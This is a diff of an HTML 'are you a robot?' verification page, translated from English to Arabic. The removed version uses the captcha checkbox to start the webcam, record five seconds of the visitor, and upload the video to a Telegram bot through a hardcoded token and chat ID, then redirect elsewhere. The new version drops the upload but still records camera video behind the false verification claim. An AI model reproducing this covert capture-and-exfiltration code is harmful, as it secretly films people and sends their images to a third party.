@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robot Verification</title>
+    <title>التحقق</title>
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -27,11 +27,6 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
-        h1 {
-            font-size: 20px;
-            margin-bottom: 15px;
-        }
-
         .checkbox-container {
             display: flex;
             justify-content: center;
@@ -53,17 +48,17 @@
             transform: scale(1.2);
         }
 
-        .loading {
+        .loading, .success {
             display: none;
             font-size: 16px;
             margin-top: 15px;
+        }
+
+        .loading {
             color: #FBC02D;
         }
 
         .success {
-            display: none;
-            font-size: 16px;
-            margin-top: 15px;
             color: #4CAF50;
         }
 
@@ -75,138 +70,59 @@
             margin: 15px 0;
             border-radius: 10px;
             background: black;
-            position: relative;
-        }
-
-        .face-frame {
-            display: none;
-            position: absolute;
-            width: 160px;
-            height: 160px; /* Changed to square */
-            border: 3px solid #FFD700;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-        }
-
-        @keyframes zoomIn {
-            0% {
-                transform: scale(0.8);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Are you a robot?</h1>
+        <h1>هل أنت روبوت؟</h1>
         <div class="checkbox-container">
             <input type="checkbox" id="robot-checkbox">
-            <label for="robot-checkbox">I'm not a robot</label>
+            <label for="robot-checkbox">لست روبوت</label>
         </div>
-        <div class="video-wrapper" style="position: relative;">
-            <video id="video" autoplay playsinline muted></video>
-            <div class="face-frame" id="face-frame"></div>
-        </div>
-        <div class="loading">Recording in progress... ⏳</div>
-        <div class="success">✅ Verification Complete!</div>
-        <div id="counter"></div>
+        <video id="video" autoplay playsinline muted></video>
+        <div class="loading">جارٍ التسجيل... ⏳</div>
+        <div class="success">✅ تم التحقق!</div>
     </div>
 
     <script>
         const video = document.getElementById('video');
-        const faceFrame = document.getElementById('face-frame');
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
-        const counterElement = document.getElementById('counter');
-        let counterInterval;
-
-        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
-        const telegramChatId = "2070423407";
 
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
-                // Show video and face frame
                 video.style.display = 'block';
-                faceFrame.style.display = 'block';
-
-                // Show loading message
                 loading.style.display = 'block';
                 success.style.display = 'none';
 
-                // Access the camera
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then((stream) => {
-                        // Display the camera feed
                         video.srcObject = stream;
 
-                        // Start recording
                         const mediaRecorder = new MediaRecorder(stream);
                         const chunks = [];
 
                         mediaRecorder.start();
+                        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 
-                        mediaRecorder.ondataavailable = (event) => {
-                            chunks.push(event.data);
-                        };
-
-                        // Change frame color on the 4th second
-                        setTimeout(() => {
-                            faceFrame.style.borderColor = '#00FF00';
-                        }, 4000);
-
-                        setTimeout(() => {
-                            mediaRecorder.stop();
-                        }, 5000); // Record for 5 seconds
+                        setTimeout(() => mediaRecorder.stop(), 5000);
 
                         mediaRecorder.onstop = () => {
-                            // After recording, show verification complete message
                             loading.style.display = 'none';
                             success.style.display = 'block';
 
-                            // Start 40-second counter
-                            let counter = 40;
-                            counterElement.textContent = `Redirecting in ${counter} seconds...`;
-                            counterInterval = setInterval(() => {
-                                counter--;
-                                counterElement.textContent = `Redirecting in ${counter} seconds...`;
-                                if (counter <= 0) {
-                                    clearInterval(counterInterval);
-                                    window.location.href = 'https://hesentv.vercel.app/';
-                                }
-                            }, 1000);
-
-                            // Send video to Telegram even while counter is live
-                            const blob = new Blob(chunks, { type: 'video/webm' });
-                            const formData = new FormData();
-                            formData.append('chat_id', telegramChatId);
-                            formData.append('video', blob, 'video.webm');
-
-                            // Send the video to Telegram in the background
-                            fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
-                                method: 'POST',
-                                body: formData
-                            }).catch((error) => {
-                                console.error('Video upload failed:', error.message);
-                            });
-
-                            // Stop the camera
                             stream.getTracks().forEach(track => track.stop());
 
-                            // Remove face frame after 5 seconds
+                            // Redirect to the quiz page
                             setTimeout(() => {
-                                faceFrame.style.display = 'none';
-                            }, 5000);
+                                window.location.href = "quiz.html";
+                            }, 2000);
                         };
                     })
                     .catch((err) => {
-                        alert("Unable to access the camera: " + err.message);
+                        alert("لا يمكن الوصول إلى الكاميرا: " + err.message);
                     });
             }
         });
